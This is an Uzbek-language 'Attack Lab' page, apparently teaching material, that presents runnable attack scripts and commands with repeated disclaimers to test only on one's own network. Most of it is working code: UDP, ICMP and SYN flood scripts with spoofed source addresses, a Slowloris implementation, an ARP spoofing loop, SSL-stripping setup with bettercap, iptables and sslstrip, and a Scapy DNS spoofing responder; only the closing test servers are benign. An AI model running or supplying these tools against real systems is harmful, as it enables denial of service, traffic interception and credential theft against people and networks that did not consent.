# Hujum amaliyotlari (Attack Lab)

**⚠️ OGOGHLANTIRISH: Bu kodlar FAQAT ta'lim maqsadida yozilgan.**

- Faqat O'Z tarmog'ingizda sinang
- Ruxsatsiz kirish JINOYAT
- Boshqa tizimlarga hujum qilish qonunan taqiqlangan
- Faqat o'rganish va himoya qilishni tushunish uchun

---

## 1. DDoS Simulyatsiya

### UDP Flood

```python
#!/usr/bin/env python3
"""
UDP Flood Simulyatsiya - FAQAT O'Z TARMOG'INGIZDA SINANG!
"""

import socket
import threading
import time

def udp_flood_worker(target_ip, target_port, duration=10):
    """UDP paketlar yuborish"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = b"X" * 1024  # 1KB payload
    end_time = time.time() + duration
    sent = 0
    
    while time.time() < end_time:
        try:
            sock.sendto(data, (target_ip, target_port))
            sent += 1
        except:
            break
    
    sock.close()
    return sent

def ddos_simulation(target_ip, target_port, num_threads=10, duration=10):
    """DDoS simulyatsiya"""
    
    print(f"⚠️  DDoS Simulyatsiya: {target_ip}:{target_port}")
    print(f"[*] {num_threads} thread, {duration} soniya")
    print("⚠️  CTRL+C to'xtatish uchun\n")
    
    threads = []
    start_time = time.time()
    
    for i in range(num_threads):
        t = threading.Thread(
            target=udp_flood_worker,
            args=(target_ip, target_port, duration)
        )
        t.start()
        threads.append(t)
        time.sleep(0.1)
    
    for t in threads:
        t.join()
    
    elapsed = time.time() - start_time
    print(f"\n[*] Tugadi: {elapsed:.1f} soniya")

# Ishlatish
if __name__ == "__main__":
    # ⚠️ FAQAT O'Z SERVERINGIZNI ISHLATING!
    TARGET = "192.168.1.100"  # O'z serveringiz IP
    PORT = 8080
    THREADS = 5
    DURATION = 5
    
    ddos_simulation(TARGET, PORT, THREADS, DURATION)
```

### ICMP Flood

```bash
# ping flood (Linux)
sudo ping -f -c 100 192.168.1.100

# hping3
sudo hping3 --icmp --flood 192.168.1.100
```

---

## 2. SYN Flood

### Scapy bilan

```python
#!/usr/bin/env python3
"""
SYN Flood - FAQAT O'Z TARMOG'INGIZDA SINANG!
"""

from scapy.all import *
import random

def syn_flood(target_ip, target_port, count=100):
    """SYN paketlar yuborish"""
    
    print(f"⚠️  SYN Flood: {target_ip}:{target_port}")
    print(f"[*] {count} ta SYN paket")
    
    sent = 0
    for i in range(count):
        try:
            # Tasodifiy manzil
            src_ip = f"{random.randint(1,254)}.{random.randint(0,254)}."
            src_ip += f"{random.randint(0,254)}.{random.randint(1,254)}"
            src_port = random.randint(1024, 65535)
            
            # SYN paket
            ip = IP(src=src_ip, dst=target_ip)
            tcp = TCP(sport=src_port, dport=target_port, flags="S")
            
            send(ip/tcp, verbose=False)
            sent += 1
            
            if sent % 20 == 0:
                print(f"[*] Sent: {sent}/{count}")
                
        except KeyboardInterrupt:
            break
    
    print(f"[*] Tugadi: {sent} paket")

# Ishlatish (faqat o'z tarmog'ingizda!)
# syn_flood("192.168.1.100", 80, 50)
```

### hping3

```bash
# SYN flood
sudo hping3 -S -p 80 --flood 192.168.1.100

# Random manzil bilan
sudo hping3 -S -p 80 --flood -a RANDOM 192.168.1.100
```

---

## 3. Slowloris

### Python versiya

```python
#!/usr/bin/env python3
"""
Slowloris - FAQAT O'Z TARMOG'INGIZDA SINANG!
"""

import socket
import time
import threading

class Slowloris:
    def __init__(self, target, port=80, num_sockets=200):
        self.target = target
        self.port = port
        self.num_sockets = num_sockets
        self.sockets = []
        self.running = False
    
    def create_socket(self):
        """Yangi socket ochish"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((self.target, self.port))
            
            # HTTP request boshlash (tugatmaslik)
            request = f"GET / HTTP/1.1\r\nHost: {self.target}\r\n"
            sock.send(request.encode())
            
            self.sockets.append(sock)
            return True
        except:
            return False
    
    def keep_alive(self, sock):
        """Socket ni jonli saqlash"""
        while self.running:
            try:
                # Sekin header qo'shish
                sock.send(f"X-a: {int(time.time())}\r\n".encode())
                time.sleep(15)
            except:
                break
    
    def start(self):
        """Hujumni boshlash"""
        self.running = True
        
        print(f"⚠️  Slowloris: {self.target}:{self.port}")
        print(f"[*] {self.num_sockets} socket yaratilmoqda...")
        
        # Socketlar yaratish
        for i in range(self.num_sockets):
            if self.create_socket():
                if (i + 1) % 50 == 0:
                    print(f"[*] {i + 1}/{self.num_sockets}")
            time.sleep(0.1)
        
        print(f"[*] {len(self.sockets)} socket tayyor")
        print("[*] Keep-alive boshlandi (CTRL+C to'xtatish)")
        
        # Keep-alive threads
        for sock in self.sockets:
            t = threading.Thread(target=self.keep_alive, args=(sock,))
            t.daemon = True
            t.start()
        
        # Kutish
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            self.stop()
    
    def stop(self):
        """Hujumni to'xtatish"""
        self.running = False
        for sock in self.sockets:
            try:
                sock.close()
            except:
                pass
        print(f"[*] To'xtatildi: {len(self.sockets)} socket yopildi")

# Ishlatish (faqat o'z tarmog'ingizda!)
if __name__ == "__main__":
    TARGET = "192.168.1.100"  # Target server
    PORT = 80
    SOCKETS = 100
    
    slowloris = Slowloris(TARGET, PORT, SOCKETS)
    slowloris.start()
```

---

## 4. ARP Spoofing

### Scapy bilan

```python
#!/usr/bin/env python3
"""
ARP Spoofing - FAQAT O'Z TARMOG'INGIZDA SINANG!
"""

from scapy.all import *
import time

def get_mac(ip):
    """IP dan MAC olish"""
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    result = srp(broadcast/arp_request, timeout=3, verbose=False)[0]
    
    if result:
        return result[0][1].hwsrc
    return None

def arp_spoof(target_ip, gateway_ip):
    """ARP spoofing"""
    
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    
    if not target_mac or not gateway_mac:
        print("❌ MAC topilmadi")
        return
    
    print(f"[*] Target: {target_ip} ({target_mac})")
    print(f"[*] Gateway: {gateway_ip} ({gateway_mac})")
    
    # Yolg'on ARP reply
    # Target ga: "Men gateway man"
    pkt1 = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    send(pkt1, verbose=False)
    
    # Gateway ga: "Men target man"
    pkt2 = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
    send(pkt2, verbose=False)

def restore(target_ip, gateway_ip):
    """ARP jadvalini tiklash"""
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    
    # To'g'ri ARP reply
    pkt1 = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    pkt2 = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac)
    
    send(pkt1, count=5, verbose=False)
    send(pkt2, count=5, verbose=False)
    print("[*] ARP jadvali tiklandi")

# Ishlatish (faqat o'z tarmog'ingizda!)
if __name__ == "__main__":
    TARGET = "192.168.1.100"      # Target qurilma
    GATEWAY = "192.168.1.1"       # Router IP
    
    print("⚠️  FAQAT O'Z TARMOG'INGIZDA SINANG!")
    print("⚠️  CTRL+C to'xtatish uchun")
    
    try:
        while True:
            arp_spoof(TARGET, GATEWAY)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[*] To'xtatildi...")
        restore(TARGET, GATEWAY)
```

### arpspoof (ettercap)

```bash
# Interface tanlash
sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
```

---

## 5. SSL Stripping

### BetterCAP

```bash
# BetterCAP ishga tushirish
sudo bettercap -iface eth0

# Modullarni yuklash
net.probe on
net.recon on
arp.spoof on

# HTTPS to HTTP
http.proxy on
http.proxy.sslstrip true
```

### Iptables yordamida

```bash
# Trafikni yo'naltirish
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080

# sslstrip ishga tushirish
sslstrip -l 8080
```

---

## 6. DNS Spoofing

### Scapy bilan

```python
#!/usr/bin/env python3
"""
DNS Spoofing - FAQAT O'Z TARMOG'INGIZDA SINANG!
"""

from scapy.all import *

def dns_spoof(pkt):
    """DNS so'rovini tutib, yolg'on javob"""
    
    if pkt.haslayer(DNSQR):
        domain = pkt[DNSQR].qname.decode()
        print(f"[*] DNS so'rov: {domain}")
        
        # Yolg'on IP
        spoofed_ip = "192.168.1.100"
        
        # DNS reply
        reply = IP(dst=pkt[IP].src) / \
                UDP(dport=pkt[UDP].sport, sport=53) / \
                DNS(
                    id=pkt[DNS].id,
                    qr=1, aa=1,
                    qd=pkt[DNS].qd,
                    an=DNSRR(rrname=pkt[DNSQR].qname, rdata=spoofed_ip)
                )
        
        send(reply, verbose=False)
        print(f"[*] Spoofed: {domain} → {spoofed_ip}")

# DNS so'rovlarni ushlab turish
print("⚠️  DNS Spoofing boshlandi")
sniff(filter="udp port 53", prn=dns_spoof, store=0)
```

---

## Sinash uchun server

### Oddiy HTTP server (Python)

```python
#!/usr/bin/env python3
"""Sinash uchun oddiy HTTP server"""

from http.server import HTTPServer, BaseHTTPRequestHandler

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(b"<h1>Test Server</h1><p>OK</p>")
    
    def log_message(self, format, *args):
        print(f"[SERVER] {args[0]}")

if __name__ == "__main__":
    server = HTTPServer(("0.0.0.0", 8080), Handler)
    print("[*] Server: http://0.0.0.0:8080")
    server.serve_forever()
```

### Sinash uchun TCP server (Go)

```go
package main

import (
    "fmt"
    "net"
    "os"
)

func main() {
    listener, err := net.Listen("tcp", ":8080")
    if err != nil {
        fmt.Println("Error:", err)
        os.Exit(1)
    }
    defer listener.Close()
    
    fmt.Println("[*] Server: :8080")
    
    for {
        conn, err := listener.Accept()
        if err != nil {
            continue
        }
        go handleConnection(conn)
    }
}

func handleConnection(conn net.Conn) {
    defer conn.Close()
    conn.Write([]byte("HTTP/1.1 200 OK\r\nContent-Length: 11\r\n\r\nHello World"))
}
```

---

## Kerakli kutubxonalar

### Python

```bash
pip install scapy
pip install requests
```

### Go (standart kutubxona)

```go
import "net"
import "net/http"
import "crypto/tls"
```

---

## Xulosa

- Bu kodlar FAQAT ta'lim uchun
- Faqat O'Z tarmog'ingizda sinang
- Ruxsatsiz hujum JINOYAT
- Himoya usullarini o'rganing
